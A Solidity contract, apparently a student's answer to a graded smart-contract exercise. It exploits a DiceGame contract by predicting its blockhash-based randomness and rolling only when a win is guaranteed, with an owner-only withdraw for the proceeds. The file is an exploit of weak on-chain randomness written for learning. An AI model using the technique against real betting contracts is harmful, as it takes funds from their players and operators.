pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address payable to, uint256 amount) external onlyOwner {
        require(amount <= address(this).balance, "Insufficient balance");
        to.transfer(amount);
        console.log("Withdrew", amount, "Wei to", to);
    }
    
    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() external {
        require(address(this).balance >= 0.002 ether, "Insufficient contract balance");
        
        bytes32 prevHash = blockhash(block.number - 1);
        uint256 rollResult = uint256(keccak256(abi.encodePacked(prevHash, address(diceGame), block.timestamp))) % 16;

        console.log("Predicted roll result:", rollResult);

        if (rollResult == 0) {
            diceGame.rollTheDice{value: 0.002 ether}();
            console.log("Rigged roll executed successfully");
        } else {
            console.log("Predicted roll result is not a winning number, skipping roll.");
        }
    }


    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {
        console.log("Received Ether:", msg.value, "Wei");
    }

}
